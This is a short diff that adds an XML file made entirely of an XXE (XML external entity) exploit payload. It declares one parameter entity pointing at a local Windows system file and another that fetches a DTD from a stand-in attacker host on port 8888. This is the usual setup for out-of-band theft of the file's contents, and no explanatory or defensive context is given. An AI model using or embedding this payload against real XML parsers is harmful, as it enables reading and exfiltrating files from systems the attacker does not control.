@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE hyp3rlinx [
+<!ENTITY % data666 SYSTEM "c:\Windows\msdfmap.ini">
+<!ENTITY % junk SYSTEM "http://ATTACKER-IP:8888/FindMeThatBiotch.dtd">
+%junk;
+%param666;
+%FindMeThatBiotch;
+]>
+
